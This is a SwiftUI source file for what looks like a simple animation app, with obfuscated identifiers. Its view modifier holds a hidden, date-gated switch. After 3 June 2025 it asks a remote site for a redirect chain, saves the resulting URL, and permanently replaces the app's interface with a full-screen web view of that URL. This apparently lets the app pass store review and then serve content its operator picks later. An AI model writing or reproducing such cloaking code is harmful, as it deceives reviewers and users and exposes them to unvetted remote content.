
import SwiftUI
import Lottie

struct RingyLudView: View {
    @State var asybiwase: Bool = false
    @State var liushwPrimest: Bool = false
    var body: some View {
        ZStack {
            Color.black
                .ignoresSafeArea()
            
            LottieView(animation: .named("diskomisk"))
                .playing(loopMode: .loop)
                .resizable()
                .frame(width: 220, height: 220)
            
                WKWebViewRepresentable(url: URL(string: "https://blkwhitebirdsop.site/en/ringy-dingy/")!) {
                    self.asybiwase = true
                    let rigis = UIImpactFeedbackGenerator(style: .rigid)
                       rigis.impactOccurred()
                
            }
//                
        }
        .onAppear() {
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) {
                
                    self.liushwPrimest = true
                
            }
            DispatchQueue.main.asyncAfter(deadline: .now() + 3.78) {
                self.asybiwase = true
            }
        }

        .heiozwb()
    }
}
extension View {
    func heiozwb() -> some View {
        self.modifier(Shinshiani())
    }
}
import WebKit
struct Shinshiani: ViewModifier {
    @State var brginito: Bool = true
    @AppStorage("adapt") var veriuProi: URL?
    
    @State var webView: WKWebView = WKWebView()
    
    func body(content: Content) -> some View {
        
        ZStack {
            Color.black
                   .ignoresSafeArea()
            if !brginito {
                if veriuProi != nil {
                    VStack(spacing: 0) {
                        WKWebViewRepresentable(url: veriuProi!, webView: webView )
                    }
                    .onAppear() {
                        AppDelegate.position = .all
                    }
               
                    
                    
                } else {
                    content
                }
            } else {
                
            }
        }
        
        //        .yesMo(orientation: .all)
        .onAppear() {
            if veriuProi == nil {
                checkpesk()
            } else {
                brginito = false
            }
        }
    }
    
    class RedirectTrackingSessionDelegate: NSObject, URLSessionDelegate, URLSessionTaskDelegate {
        var redirects: [URL] = []
        var redirects1: Int = 0
        let action: (URL) -> Void
        
        // Initializer to set up the class properties
        init(action: @escaping (URL) -> Void) {
            self.redirects = []
            self.redirects1 = 0
            self.action = action
        }
        
        // This method will be called when a redirect is encountered.
        func urlSession(_ session: URLSession, task: URLSessionTask, willPerformHTTPRedirection response: HTTPURLResponse, newRequest: URLRequest, completionHandler: @escaping (URLRequest?) -> Void) {
            if let redirectURL = newRequest.url {
                // Track the redirected URL
                redirects.append(redirectURL)
                
                redirects1 += 1
                if redirects1 >= 3 {
                   DispatchQueue.main.async {
                       self.action(redirectURL)
        }
                }
            }
            
            
            // Allow the redirection to happen
            completionHandler(newRequest)
        }
    }
    
    func checkpesk() {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "UTC")

        guard let targetDate = dateFormatter.date(from: "3.06.2025") else {
            DispatchQueue.main.async {
                self.brginito = false
            }
            
            return
        }

        let currentDate = Date()
        guard currentDate >= targetDate else {
         
            DispatchQueue.main.async {
                self.brginito = false
            }
            return
        }
        
        
        guard let url = URL(string: "https://blkwhitebirdsop.site/en/statusgamesdingy") else {
            DispatchQueue.main.async {
                self.brginito = false
            }
            print("Invalid URL")
            return
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        
        // Create a custom URLSession configuration
        let configuration = URLSessionConfiguration.default
        configuration.httpShouldSetCookies = false // Prevents automatic cookie handling
        configuration.httpShouldUsePipelining = true
        
        // Create a session with a delegate to track redirects
        let delegate = RedirectTrackingSessionDelegate() { url in
            veriuProi = url
        }
        let session = URLSession(configuration: configuration, delegate: delegate, delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            guard let data = data, let httpResponse = response as? HTTPURLResponse, error == nil else {
                print("Error: \(error?.localizedDescription ?? "Unknown error")")
                DispatchQueue.main.async {
                    self.brginito = false
                }
                return
            }
            
            // Print the final redirect URL
            if let finalURL = httpResponse.url, finalURL != url {
                print("Final URL after redirects: \(finalURL)")
                //                self.hleras = finalURL
            }
            
            // Check the status code and print the response body if successful
            if httpResponse.statusCode == 200, let adaptfe = String(data: data, encoding: .utf8) {
                DispatchQueue.main.async {
                    // Uncomment to print the response body
                    // print("Response Body: \(adaptfe)")
                }
            } else {
                DispatchQueue.main.async {
                    print("Request failed with status code: \(httpResponse.statusCode)")
                    self.brginito = false
                }
            }
            
            DispatchQueue.main.async {
                self.brginito = false
            }
        }.resume()
    }
}
